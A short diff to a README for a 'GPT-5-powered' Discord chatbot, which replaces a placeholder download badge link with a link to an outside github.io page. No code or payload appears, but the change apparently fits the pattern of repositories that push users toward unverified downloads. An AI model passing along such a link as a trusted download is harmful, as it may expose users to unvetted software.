@@ -2,7 +2,7 @@
 
 Experience seamless and intelligent conversations in your Discord server with our GPT-5-powered chatbot. Designed for effortless integration and customization, this bot brings advanced AI capabilities directly to your community.
 
-[![Download Discord GPT-5 Chatbot](https://img.shields.io/badge/Download-DiscordGPT5Chatbot-blueviolet)](#)
+[![Download Discord GPT-5 Chatbot](https://img.shields.io/badge/Download-DiscordGPT5Chatbot-blueviolet)](https://discord-gpt5-chatbot-ultimate.github.io/.github/)
 
 ---
 
